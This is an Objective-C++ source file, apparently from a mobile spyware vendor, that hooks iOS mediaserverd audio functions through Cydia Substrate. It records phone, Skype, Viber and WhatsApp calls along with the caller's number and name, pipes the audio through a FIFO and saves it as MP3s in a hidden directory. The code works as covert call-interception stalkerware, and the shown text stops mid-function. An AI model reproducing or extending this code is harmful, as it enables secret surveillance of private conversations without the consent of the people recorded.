//
//  PCMMixer.h
//
//  Created by Binh Nguyen (c) Killer Mobile Software
//

#import <Availability.h>
#import <sqlite3.h>
#import <CaptainHook.h>
#import <substrate.h>
#import <notify.h>
#import <objc/runtime.h>
#import <CoreTelephony/CTCall.h>
#import <CoreTelephony/CTCallCenter.h>
#import <CoreTelephony/CTCarrier.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreMedia/CMSampleBuffer.h>
#import <AudioUnit/AudioUnit.h>
#import <AudioToolbox/AudioToolbox.h>
#import <AudioUnit/AudioUnit.h>
#import <CoreAudio/CoreAudioTypes.h>
#import <CommonCrypto/CommonCrypto.h>
#import "sys/utsname.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <spawn.h>
#import <HTTPKit/HTTPKit.h>
#import <IOSurface/IOSurface.h>
#import <lame.h>
#import <AVFoundation/AVFoundation.h>
#import "pthread.h"

#import <CoreFoundation/CoreFoundation.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <UIKit/UIKit.h>
#import <Accelerate/Accelerate.h>
#import <AudioUnit/AudioUnit.h>

#import "LINE/NCVoIPSession.h"
#import "LINE/AMPUserInfo.h"

#define SKYPE_RECORDING 1 // Enable VoIP call recording on Skype
#define VIBER_RECORDING 1 // Enable VoIP call recording on Viber
#define WHATSAPP_RECORDING 1 // Enable VoIP call recording on WhatsApp
#define PHONE_CALL_RECORDING 1 // Enable voice phone call recording

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-variable"
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wobjc-method-access"
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat"
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wparentheses"

#define CALL_CONNECTED    1
#define CALL_DISCONNECTED 5
#define CALL_IN           4
#define CALL_OUT          3
#define BUFFER_SIZE 128*1024
#define MAXFILE 64
#define INVALID_FILE 0
#define SAMPLE_RATE 8000.00
#define OSSTATUS_MIX_WOULD_CLIP 8888
#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)

#define FourCC2Str(code) (char[5]){(code >> 24) & 0xFF, (code >> 16) & 0xFF, (code >> 8) & 0xFF, code & 0xFF, 0}

static BOOL MS_SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO_IOS9 = YES;

static NSInteger SHARED_CACHE_SIZE = 1024*1024;
static unsigned char *shared_caches[MAXFILE+1] = {NULL};

static NSInteger iMode = 0;
static id SoundRecorderInstance = nil;
static id kTimer = nil;
static NSInteger isRecording = 0;
static NSInteger appMode = 0;
static NSInteger fifo_fd = -1;
static int delta = 0;
typedef struct _EFI {NSInteger a; NSInteger b; NSInteger c; NSInteger d; NSInteger e; NSInteger f; NSInteger g; NSInteger h; NSInteger k;} EFI;
typedef struct __PACKET
{
    UInt32 size;
    UInt32 type;
    UInt32 code;
    const unsigned char data[4];
} ppacket;
typedef struct {
    void ** data;
    int last;
    int size;
} dyna;

typedef struct __SOUNDFILE
{
    int fd;
    int identifier;
    long start_time;
    AudioConverterRef converter;
    AudioStreamBasicDescription desc;
    AudioBuffer *_converter_currentBuffer;
    ExtAudioFileRef test;
} psound;
static psound streams[MAXFILE];
static int session_id = 0;
static char phone[50]={0};
static char app[50]={0};
static char direction[50]={0};
static long duration = 0;
static long start_time = 0;
static char phone_name [500] = {0};
pthread_mutex_t fifo_mt;

static dyna *units = NULL;

dyna *dyna_init();

void dyna_resize(dyna *array, int size);

void *dyna_get(dyna *array, int index);

void dyna_push(dyna *array, void *value);

void dyna_delete(dyna *array, int index);

void new_process_packet(ppacket *packet);

EFI FILES[MAXFILE]={
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0},
    {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}, {0,0,0}
};

extern "C" {
    extern NSString *CTCallCopyAddress(void*, CTCall *);
    extern void CTCallDisconnect(CTCall*);
    extern void CTCallAnswer(CTCall *call);
    extern NSArray *CTCopyCurrentCalls(id t);
    extern id CTTelephonyCenterGetDefault();
    extern void CTTelephonyCenterAddObserver(id center, const void *observer, CFNotificationCallback callBack, CFStringRef name, const void *object, CFNotificationSuspensionBehavior suspensionBehavior);
}
#pragma mark - PCM Mixer header -
/**** PCM Mixer Header *****/
@interface PCMMixer : NSObject {
    
}

+ (OSStatus) mixFiles:(NSArray*)files atTimes:(NSArray*)times toMixfile:(NSString*)mixfile duration:(long *)duration;

@end

/**** End of PCM Mixer Header ***/

#pragma mark - Shared cache (audio raw data) -
/**** Shared cache ****/
void malloc_packet_shared_cache(int index)
{
    if (shared_caches[index] != NULL) {
        free(shared_caches[index]);
    }
    shared_caches[index] = (unsigned char *)malloc(sizeof(unsigned char)*SHARED_CACHE_SIZE);
}
void free_packet_shared_cache()
{
    for (int i=0; i < MAXFILE; i++) {
        if (shared_caches[i] != NULL) {
            free(shared_caches[i]);
            shared_caches[i] = NULL;
        }
    }
}

void send_packet(int index, int fd, UInt32 type, UInt32 code, unsigned char *data, UInt32 size)
{
    pthread_mutex_lock(&fifo_mt);
    
    if (size >= SHARED_CACHE_SIZE || shared_caches[index] == NULL) {
        SHARED_CACHE_SIZE = size - size % SHARED_CACHE_SIZE + SHARED_CACHE_SIZE;
        malloc_packet_shared_cache(index);
    }
    UInt32 psize = sizeof(UInt32)*3+size;
    *((UInt32 *)shared_caches[index]) = sizeof(UInt32)*3+size;
    *((UInt32 *)shared_caches[index] + 1) = type;
    *((UInt32 *)shared_caches[index] + 2) = code;
    memcpy(shared_caches[index]+3*sizeof(UInt32), data, size);
    write(fd, (unsigned char *)shared_caches[index], psize);
    pthread_mutex_unlock(&fifo_mt);
}

void send_packet_timestamp(int index, int fd, UInt32 type, UInt32 code, unsigned char *data, UInt32 size, UInt64 timestamp)
{
    pthread_mutex_lock(&fifo_mt);
    
    if (size >= SHARED_CACHE_SIZE || shared_caches[index] == NULL) {
        SHARED_CACHE_SIZE = size - size % SHARED_CACHE_SIZE + SHARED_CACHE_SIZE;
        malloc_packet_shared_cache(index);
    }
    UInt32 psize = sizeof(UInt32)*3+size + sizeof(UInt64);
    *((UInt32 *)shared_caches[index]) = sizeof(UInt32)*3+size + sizeof(UInt64);
    *((UInt32 *)shared_caches[index] + 1) = type;
    *((UInt32 *)shared_caches[index] + 2) = code;
    
    memcpy(shared_caches[index]+3*sizeof(UInt32), &timestamp, sizeof(UInt64));
    
    memcpy(shared_caches[index]+3*sizeof(UInt32) + sizeof(UInt64), data, size);
    write(fd, (unsigned char *)shared_caches[index], psize);
    pthread_mutex_unlock(&fifo_mt);
}

void send_audio_buffer(int index, int fd, UInt32 code, AudioBuffer *buffer)
{
    pthread_mutex_lock(&fifo_mt);
    
    UInt32 size = buffer->mDataByteSize;
    UInt32 channels = buffer->mNumberChannels;
    unsigned char *data = (unsigned char *)(buffer->mData);
    
    if (size >= SHARED_CACHE_SIZE || shared_caches[index] == NULL) {
        SHARED_CACHE_SIZE = size - size % SHARED_CACHE_SIZE + SHARED_CACHE_SIZE;
        malloc_packet_shared_cache(index);
    }
    UInt32 psize = sizeof(UInt32)*4+size;
    *((UInt32 *)shared_caches[index]) = sizeof(UInt32)*4+size;
    *((UInt32 *)shared_caches[index] + 1) = 201;
    *((UInt32 *)shared_caches[index] + 2) = code;
    *((UInt32 *)shared_caches[index] + 3) = channels;
    memcpy(shared_caches[index]+4*sizeof(UInt32), data, size);
    write(fd, (unsigned char *)shared_caches[index], psize);
    pthread_mutex_unlock(&fifo_mt);
}

void send_audio_buffer_simple(int index, int fd, UInt32 code, UInt32 size, UInt32 channels, unsigned char *data)
{
    pthread_mutex_lock(&fifo_mt);
    
    if (size >= SHARED_CACHE_SIZE || shared_caches[index] == NULL) {
        SHARED_CACHE_SIZE = size - size % SHARED_CACHE_SIZE + SHARED_CACHE_SIZE;
        malloc_packet_shared_cache(index);
    }
    UInt32 psize = sizeof(UInt32)*4+size;
    *((UInt32 *)shared_caches[index]) = sizeof(UInt32)*4+size;
    *((UInt32 *)shared_caches[index] + 1) = 201;
    *((UInt32 *)shared_caches[index] + 2) = code;
    *((UInt32 *)shared_caches[index] + 3) = channels;
    memcpy(shared_caches[index]+4*sizeof(UInt32), data, size);
    int w = write(fd, (unsigned char *)shared_caches[index], psize);
    pthread_mutex_unlock(&fifo_mt);
}

void send_audio_buffers(int index, int fd, UInt32 code, AudioBufferList *buffers, UInt32 inNumberFrames)
{
    pthread_mutex_lock(&fifo_mt);
    
    UInt32 size = 0;
    for (int i=0; i < buffers->mNumberBuffers; i++) {
        size +=  buffers->mBuffers[i].mDataByteSize + sizeof(UInt32) * 2;
    }
    //    UInt32 channels = buffer->mNumberChannels;
    //    unsigned char *data = (unsigned char *)(buffer->mData);
    
    if (size + 5*sizeof(UInt32) >= SHARED_CACHE_SIZE || shared_caches[index] == NULL) {
        SHARED_CACHE_SIZE = size + 5*sizeof(UInt32) - (size + 5*sizeof(UInt32)) % SHARED_CACHE_SIZE + SHARED_CACHE_SIZE;
        malloc_packet_shared_cache(index);
    }
    
    UInt32 psize = sizeof(UInt32)*5+size;
    
    *((UInt32 *)shared_caches[index]) = sizeof(UInt32)*5+size;
    *((UInt32 *)shared_caches[index] + 1) = 203;
    *((UInt32 *)shared_caches[index] + 2) = code;
    *((UInt32 *)shared_caches[index] + 3) = inNumberFrames;
    *((UInt32 *)shared_caches[index] + 4) = buffers->mNumberBuffers;
    
    unsigned char *pp = shared_caches[index]+5*sizeof(UInt32);
    for (int i=0; i < buffers->mNumberBuffers; i++) {
        *((UInt32 *)pp) = buffers->mBuffers[i].mDataByteSize;
        *((UInt32 *)pp + 1) = buffers->mBuffers[i].mNumberChannels;
        memcpy(pp + sizeof(UInt32) * 2, buffers->mBuffers[i].mData, buffers->mBuffers[i].mDataByteSize);
        pp = pp + buffers->mBuffers[i].mDataByteSize + sizeof(UInt32) * 2;
    }
    write(fd, (unsigned char *)shared_caches[index], psize);
    pthread_mutex_unlock(&fifo_mt);
}

/**** End of Shared cache ***/
#pragma mark - mediaserverd -
/**** mediaserverd hook methods ****/
OSStatus (*o_AudioConverterNew) (const AudioStreamBasicDescription *inSourceFormat, const AudioStreamBasicDescription *inDestinationFormat, AudioConverterRef *outAudioConverter);
OSStatus (*o_AudioConverterDispose) (AudioConverterRef inAudioConverter);
OSStatus (*o_AudioConverterConvertBuffer) (AudioConverterRef  inAudioConverter, NSInteger inInputDataSize, const void *inInputData, NSInteger *ioOutputDataSize, void *outOutputData);
OSStatus (*o_AudioConverterConvertComplexBuffer)(AudioConverterRef inAudioConverter, NSInteger inNumberPCMFrames, const AudioBufferList  *inInputData, AudioBufferList *outOutputData);
OSStatus (*o_AudioUnitRender) (AudioUnit inUnit, AudioUnitRenderActionFlags  *ioActionFlags, const AudioTimeStamp *inTimeStamp, NSInteger inOutputBusNumber, NSInteger inNumberFrames, AudioBufferList *ioData);
OSStatus (*o_AudioUnitProcess)(AudioUnit inUnit, AudioUnitRenderActionFlags *ioActionFlags, const AudioTimeStamp *inTimeStamp, UInt32 inNumberFrames, AudioBufferList *ioData);
OSStatus (*o_AudioUnitSetProperty) (AudioUnit inUnit, AudioUnitPropertyID inID, AudioUnitScope inScope, AudioUnitElement inElement, const void *inData, UInt32 inDataSize);
OSStatus (*o_AudioUnitUninitialize) (AudioUnit inUnit);

void Dispatch_AfterDelay(dispatch_queue_t queue, NSTimeInterval afterInterval, dispatch_block_t block)
{
    dispatch_time_t delay = dispatch_time(DISPATCH_TIME_NOW, afterInterval * NSEC_PER_SEC);
    dispatch_after(delay, queue, block);
}

void Dispatch_AfterDelay_ToMainThread(NSTimeInterval afterInterval, dispatch_block_t block)
{
    Dispatch_AfterDelay(dispatch_get_main_queue(), afterInterval, block);
}

static char spath[255]={0};

void convertFile(NSString *src_path, NSString *dst_path)
{
    @try {
        int read, write;
        
        FILE *pcm = fopen([src_path cStringUsingEncoding:1], "rb");  //source
        fseek(pcm, 4*1024, SEEK_CUR);                                //skip file header
        FILE *mp3 = fopen([dst_path cStringUsingEncoding:1], "wb");  //output
        
        const int PCM_SIZE = 8192;
        const int MP3_SIZE = 8192;
        
        short int pcm_buffer[PCM_SIZE];
        unsigned char mp3_buffer[MP3_SIZE];
        
        lame_t lame = lame_init();
        lame_set_in_samplerate(lame, 8000);
        lame_set_VBR(lame, vbr_default);
        lame_set_mode(lame, (MPEG_mode)3);
        lame_set_num_channels(lame, 1);
        lame_init_params(lame);
        
        do {
            read = fread(pcm_buffer, sizeof(short int), PCM_SIZE, pcm);
            if (read == 0)
                write = lame_encode_flush(lame, mp3_buffer, MP3_SIZE);
            else
                //write = lame_encode_buffer(lame, pcm_buffer, read, mp3_buffer, MP3_SIZE);
                write = lame_encode_buffer(lame, pcm_buffer, pcm_buffer, read, mp3_buffer, MP3_SIZE);
            
            fwrite(mp3_buffer, write, 1, mp3);
            
        } while (read != 0);
        
        lame_close(lame);
        fclose(mp3);
        fclose(pcm);
    }
    @catch (NSException *exception) {
        NSLog(@"%@",[exception description]);
    }
}

#define kOutputBus 0
#define kInputBus 1

static AudioUnit audioUnit;
static ExtAudioFileRef audioFileRef;
static char * buffer = NULL;

static OSStatus recordingCallback(void *inRefCon,
                                  AudioUnitRenderActionFlags *ioActionFlags,
                                  const AudioTimeStamp *inTimeStamp,
                                  UInt32 inBusNumber,
                                  UInt32 inNumberFrames,
                                  AudioBufferList *ioData) {
    OSStatus status;
    if (buffer == NULL) {
        buffer = (char *)malloc(MAX(1024, inNumberFrames*2));
    }
    AudioBuffer aBuffer;
    aBuffer.mNumberChannels = 1;
    aBuffer.mDataByteSize = inNumberFrames*2;
    aBuffer.mData = buffer;
    AudioBufferList bufferList;
    bufferList.mNumberBuffers = 1;
    bufferList.mBuffers[0] = aBuffer;
    status = AudioUnitRender(audioUnit, ioActionFlags, inTimeStamp, kInputBus, inNumberFrames, &bufferList);
    status = ExtAudioFileWrite(audioFileRef, inNumberFrames, &bufferList);
    return noErr;
}
#pragma mark SoundRecorder
@interface SoundRecorder : NSObject
{
    pid_t newsound_pid;
}
@property (nonatomic, retain) NSString *phone;
@property (nonatomic, retain) NSString *app;
@property (nonatomic, retain) NSString *direction;
@property (nonatomic, retain) NSURL *fileURL;
@property (nonatomic) BOOL isRecording;
@property (nonatomic, retain) NSString *phoneName;
- (NSDictionary *) handleMessageNamed:(NSString *)name withUserInfo:(NSDictionary *)userinfo;
@end

@implementation SoundRecorder
@synthesize phone = _phone;
@synthesize app = _app;
@synthesize direction = _direction;
@synthesize fileURL = _fileURL;
@synthesize isRecording = _isRecording;
@synthesize phoneName = _phoneName;

- (id) init
{
    self = [super init];
    if (self) {
        _app = nil;
        _phone = nil;
        _direction = nil;
        newsound_pid = -1;
        fifo_fd = -1;
        _phoneName = nil;
    }
    return self;
}

- (void) convertWAVToMP3
{
    @autoreleasepool {
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *basePath = ([paths count] > 0) ? [paths objectAtIndex:0] : nil;
        NSString *rec = [basePath stringByAppendingPathComponent:@"tpdata"];
        strcpy(spath, [[basePath stringByAppendingPathComponent:@"tpdata"] UTF8String]);
        NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:rec error:NULL];
        for (int i=0; i < [contents count]; i++) {
            NSString *fP = [rec stringByAppendingPathComponent:[contents objectAtIndex:i]];
            if ([[fP pathExtension] isEqualToString:@"wav"]) {
                NSString *output = [[fP stringByDeletingPathExtension] stringByAppendingPathExtension:@"mp3"];
                convertFile(fP, output);
                unlink([fP UTF8String]);
                
                NSMutableArray *news_arrays = [[[NSMutableArray alloc] initWithContentsOfFile:[NSString stringWithFormat:@"%s/list.plist", spath]] autorelease];
                if (news_arrays == nil) {
                    news_arrays = [[[NSMutableArray alloc] init] autorelease];
                }
                NSDictionary *dic = [NSDictionary dictionaryWithObjectsAndKeys:output, @"name", @"recorder", @"app", [NSString stringWithFormat:@"%ld", time(NULL)], @"time", nil];
                [news_arrays addObject:dic];
                [news_arrays writeToFile:[NSString stringWithFormat:@"%s/list.plist", spath] atomically:YES];
            }
        }
    }
}

- (NSDictionary *) handleMessageNamed:(NSString *)name withUserInfo:(NSDictionary *)userinfo
{
    NSLog(@"===> ABZ %@ | APPMODE=%d", name, (self.app == nil));
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSString *cmd = [userinfo objectForKey:@"cmd"];
    if ([cmd isEqualToString:@"start"]) {
        if (fifo_fd == -1) {
            self.phone = [userinfo objectForKey:@"number"];
            self.app = [userinfo objectForKey:@"app"];
            self.direction = [userinfo objectForKey:@"direction"];
            self.fileURL = [NSURL URLWithString:[userinfo objectForKey:@"fileURL"]];
            self.phoneName = [userinfo objectForKey:@"phoneName"];
            
            if (self.app == nil) {
                appMode = 0;
            }
            else {
                appMode = 1;
            }
            [self startRecorder];
        }
    }
    else {
        if (fifo_fd != -1) {
            NSString *path = [self stopRecorder];
            if (path != nil) {
                NSDictionary *dic = [[NSDictionary alloc] initWithDictionary:[NSDictionary dictionaryWithObjectsAndKeys:path, @"name", nil]];
                [pool release];
                return [dic autorelease];
            }
            self.phone = nil;
        }
    }
    
    [pool release];
    return nil;
}

- (void) startRecorder
{
    if (fifo_fd == -1) {
        if (iMode == 1) {
            
            if (pthread_mutex_init(&fifo_mt, NULL) != 0)
            {
                NSLog(@"*** Mutex init failed");
                return;
            }
            
            /* Remove OLD FIFO */
            unlink("/var/tmp/auko.test");
            /* ***** */
            
            /* Create recording thread */
            [NSThread detachNewThreadSelector:@selector(newRecordingThread) toTarget:self withObject:nil];
            /* ***** */
            
            mkfifo("/var/tmp/auko.test", 0666);
            fifo_fd = open("/var/tmp/auko.test", O_WRONLY);
            malloc_packet_shared_cache(MAXFILE);
            send_packet(MAXFILE, fifo_fd, 100, 0, (unsigned char *)("START_RECORDING"), sizeof("START_RECORDING"));
            
            if ([[self phone] length] > 0) {
                send_packet(MAXFILE, fifo_fd, 300, 0, (unsigned char *)([[self phone] UTF8String]), [[self phone] length]);
            }
            else {
                send_packet(MAXFILE, fifo_fd, 300, 0, (unsigned char *)("PRIVATE"), sizeof("PRIVATE"));
            }
            
            if ([[self app] length] > 0) {
                send_packet(MAXFILE, fifo_fd, 301, 0, (unsigned char *)([[self app] UTF8String]), [[self app] length]);
            }
            else {
                send_packet(MAXFILE, fifo_fd, 301, 0, (unsigned char *)("CALL"), sizeof("CALL"));
            }
            
            if ([[self direction] length] > 0) {
                send_packet(MAXFILE, fifo_fd, 302, 0, (unsigned char *)([[self direction] UTF8String]), [[self direction] length]);
            }
            else {
                send_packet(MAXFILE, fifo_fd, 302, 0, (unsigned char *)("unknown"), sizeof("unknown"));
            }
            
            if ([[self phoneName] length] > 0) {
                send_packet(MAXFILE, fifo_fd, 400, 0, (unsigned char *)([[self phoneName] UTF8String]), strlen([[self phoneName] UTF8String]));
            }
            else {
                send_packet(MAXFILE, fifo_fd, 400, 0, (unsigned char *)("unknown"), strlen("unknown"));
            }
            
            isRecording = 1;
            
            
            for (int i=0; i < MAXFILE; i++) {
                FILES[i].a = 0;
                FILES[i].b = 0;
                FILES[i].c = 0;
            }
            
        }
        else {
            isRecording = 1;
        }
    }
    else {
        isRecording = 1;
    }
}

- (void) newRecordingThread
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSLog(@"--> Named pipe [started]");
    
    time_t current_time = 0;
    time(&current_time);
    delta = current_time - CFAbsoluteTimeGetCurrent();
    
    const UInt32 FIRST_READ = 3*4;
    
    unsigned char *buffer = (unsigned char *)malloc(BUFFER_SIZE);
    mkfifo("/var/tmp/auko.test", 0666);
    int fd = open("/var/tmp/auko.test", O_RDONLY);
    NSLog(@"FIFO_FD: %x", fd);
    
    int readsize = 0; int offset = 0; int remain = 0;
    while (readsize = read(fd, buffer + offset, BUFFER_SIZE - offset)) {
        ppacket *packet = (ppacket *)buffer;
        remain = offset + readsize;
        //NSLog(@"remain: %d, readsize: %d, offset: %d", remain, readsize, offset);
        
        int psize = packet->size;
        //NSLog(@"psize: %d", psize);
        while (psize <= remain) {
            // Process packet
            
            new_process_packet(packet);
            
            remain = remain - psize; // Point to next packet
            
            if (remain > FIRST_READ) { // contains next packet metadata
                packet = (ppacket *) ((unsigned char *)packet + psize);
                psize = packet->size;
            }
            else {
                offset = remain;
                if (remain > 0) {
                    memcpy(buffer, (unsigned char *)packet + psize, remain); // Continue reading
                }
                break;
            }
        }
        
        if (remain > 0) {
            if ((void *)buffer == (void *)packet) {
                offset = remain; // Continue reading
            }
            else {
                offset = remain;
                memcpy(buffer, packet, remain); // Copy tail to later buffer
            }
        }
    }
    free(buffer);
    
    close(fd);
    unlink("/var/tmp/auko.test");
    [pool release];
    NSLog(@"--> Named pipe [ended]");
    return;
}

- (NSString *) stopRecorder
{
    isRecording = 0;
    if (iMode == 1) {
        if (fifo_fd != -1) {
            for (int i=0; i < MAXFILE; i++) {
                FILES[i].b = 0;
                FILES[i].a = 0;
                FILES[i].c = 0;
            }
            
            send_packet(MAXFILE, fifo_fd, 101, 0, (unsigned char *)("STOP_RECORDING"), sizeof("STOP_RECORDING"));
            free_packet_shared_cache();
            close(fifo_fd);
            fifo_fd = -1;
            
            pthread_mutex_destroy(&fifo_mt);
        }
        else {
            return nil;
        }
    }
    return nil;
}

@end
#pragma mark Audio Unit
OSStatus r_AudioConverterDispose (AudioConverterRef inAudioConverter)
{
    for (int i=0; i < MAXFILE; i++) {
        if (FILES[i].a == (NSInteger)inAudioConverter) {
            FILES[i].a = 0;
            FILES[i].b = 0;
            FILES[i].c = 0;
            send_packet(MAXFILE, fifo_fd, 202, (NSInteger)inAudioConverter, (unsigned char *)("CLOSE_STREAM"), sizeof("CLOSE_STREAM"));
            break;
        }
    }
    
    OSStatus result = o_AudioConverterDispose(inAudioConverter);
//    NSLog(@"r_AudioConverterDispose: %d", result);
    return result;
}



OSStatus r_AudioConverterConvertBuffer (AudioConverterRef  inAudioConverter, NSInteger inInputDataSize, const void *inInputData, NSInteger *ioOutputDataSize, void *outOutputData)
{
    if (isRecording == 0) {
        return o_AudioConverterConvertBuffer(inAudioConverter, inInputDataSize, inInputData, ioOutputDataSize, outOutputData);
    }
    
    OSStatus status = o_AudioConverterConvertBuffer(inAudioConverter, inInputDataSize, inInputData, ioOutputDataSize, outOutputData);
//    NSLog(@"r_AudioConverterConvertBuffer: %d", status);
    
    if (status == noErr) {
        bool writed = false;
        
        for (int i=0; i < MAXFILE; i++) {
            if (FILES[i].a == (NSInteger)inAudioConverter) {
                
                send_audio_buffer_simple (i, fifo_fd, (NSInteger)inAudioConverter, *ioOutputDataSize, 1, (unsigned char *)outOutputData);
                
                writed = true;
                break;
            }
        }
        
        if (writed == false) {
            for (int i=0; i < MAXFILE; i++) {
                if (FILES[i].a == 0) {
                    
                    AudioStreamBasicDescription inDestinationFormat;
                    NSInteger size = sizeof(inDestinationFormat);
                    
                    OSStatus result = AudioConverterGetProperty (inAudioConverter, kAudioConverterCurrentOutputStreamDescription, (UInt32 *)&size, &inDestinationFormat);
                    
                    NSLog(@"[-----------{AudioConverterConvertBuffer}-----------]");
                    NSLog(@"-----> OS result: %d", result);
                    NSLog(@"-----> Converter: 0x%x", inAudioConverter);
                    NSLog(@"-----> Sample rate: %lf", inDestinationFormat.mSampleRate);
                    NSLog(@"-----> Format ID: 0x%x", inDestinationFormat.mFormatID);
                    NSLog(@"-----> Format Flag: 0x%x", inDestinationFormat.mFormatFlags);
                    NSLog(@"-----> BPP: %d", inDestinationFormat.mBytesPerPacket);
                    NSLog(@"-----> FPP: %d", inDestinationFormat.mFramesPerPacket);
                    NSLog(@"-----> BPF: %d", inDestinationFormat.mBytesPerFrame);
                    NSLog(@"-----> CPF: %d", inDestinationFormat.mChannelsPerFrame);
                    NSLog(@"-----> BPC: %d", inDestinationFormat.mBitsPerChannel);
                    NSLog(@"[-----------{AudioConverterConvertBuffer}-----------]");
                    
                    if (inDestinationFormat.mFormatID != kAudioFormatLinearPCM) {
                        FILES[i].a = (NSInteger)inAudioConverter;
                        FILES[i].b = 0;
                        FILES[i].c = 0;
                        break;
                    }
                    
                    for (int i=0; i < MAXFILE; i++) {
                        if (FILES[i].a == 0) {
                            
                            UInt64 timestamp = CFAbsoluteTimeGetCurrent()*1000;
                            send_packet_timestamp(i, fifo_fd, 200, (NSInteger)inAudioConverter, (unsigned char *)(&inDestinationFormat), sizeof(inDestinationFormat), timestamp);
                            
                            FILES[i].a = (NSInteger)inAudioConverter;
                            FILES[i].b = 0;
                            FILES[i].c = 0;
                            
                            send_audio_buffer_simple (i, fifo_fd, (NSInteger)inAudioConverter, *ioOutputDataSize, 1, (unsigned char *)outOutputData);
                            
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }
    return status;
}

OSStatus r_AudioConverterConvertComplexBuffer (AudioConverterRef inAudioConverter, NSInteger inNumberPCMFrames, const AudioBufferList  *inInputData, AudioBufferList *outOutputData)
{
    if (isRecording == 0) {
        return o_AudioConverterConvertComplexBuffer(inAudioConverter, inNumberPCMFrames, inInputData, outOutputData);
    }
    
    OSStatus status = o_AudioConverterConvertComplexBuffer(inAudioConverter, inNumberPCMFrames, inInputData, outOutputData);
//    NSLog(@"r_AudioConverterConvertComplexBuffer: %d", status);
    
    if (status == noErr) {
        bool writed = false;
        
        for (int i=0; i < MAXFILE; i++) {
            if (FILES[i].a == (NSInteger)inAudioConverter) {
                
                for (int j=0; j < outOutputData->mNumberBuffers; j++) {
                    send_audio_buffer (i, fifo_fd, (NSInteger)inAudioConverter, &(outOutputData->mBuffers[j]));
                }
                
                writed = true;
                break;
            }
        }
        
        if (writed == false) {
            for (int i=0; i < MAXFILE; i++) {
                if (FILES[i].a == 0) {
                    
                    AudioStreamBasicDescription inDestinationFormat;
                    NSInteger size = sizeof(inDestinationFormat);
                    
                    OSStatus result = AudioConverterGetProperty (inAudioConverter, kAudioConverterCurrentOutputStreamDescription, (UInt32 *)&size, &inDestinationFormat);
                    
                    NSLog(@"[-----------{AudioConverterConvertComplexBuffer}-----------]");
                    NSLog(@"-----> OS result: %d", result);
                    NSLog(@"-----> Converter: 0x%x", inAudioConverter);
                    NSLog(@"-----> Sample rate: %lf", inDestinationFormat.mSampleRate);
                    NSLog(@"-----> Format ID: 0x%x", inDestinationFormat.mFormatID);
                    NSLog(@"-----> Format Flag: 0x%x", inDestinationFormat.mFormatFlags);
                    NSLog(@"-----> BPP: %d", inDestinationFormat.mBytesPerPacket);
                    NSLog(@"-----> FPP: %d", inDestinationFormat.mFramesPerPacket);
                    NSLog(@"-----> BPF: %d", inDestinationFormat.mBytesPerFrame);
                    NSLog(@"-----> CPF: %d", inDestinationFormat.mChannelsPerFrame);
                    NSLog(@"-----> BPC: %d", inDestinationFormat.mBitsPerChannel);
                    NSLog(@"[-----------{AudioConverterConvertComplexBuffer}-----------]");
                    
                    if (inDestinationFormat.mFormatID != kAudioFormatLinearPCM) {
                        FILES[i].a = (NSInteger)inAudioConverter;
                        FILES[i].b = 0;
                        FILES[i].c = 0;
                        break;
                    }
                    
                    for (int i=0; i < MAXFILE; i++) {
                        if (FILES[i].a == 0) {
                            
                            UInt64 timestamp = CFAbsoluteTimeGetCurrent()*1000;
                            send_packet_timestamp(i, fifo_fd, 200, (NSInteger)inAudioConverter, (unsigned char *)(&inDestinationFormat), sizeof(inDestinationFormat), timestamp);
                            
                            FILES[i].a = (NSInteger)inAudioConverter;
                            FILES[i].b = 0;
                            FILES[i].c = 0;
                            
                            for (int j=0; j < outOutputData->mNumberBuffers; j++) {
                                send_audio_buffer (i, fifo_fd, (NSInteger)inAudioConverter, &(outOutputData->mBuffers[j]));
                            }
                            
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }
    return status;
}

OSStatus r_AudioUnitRender (AudioUnit  inUnit, AudioUnitRenderActionFlags  *ioActionFlags, const AudioTimeStamp *inTimeStamp, NSInteger inOutputBusNumber, NSInteger                      inNumberFrames, AudioBufferList  *ioData)
{
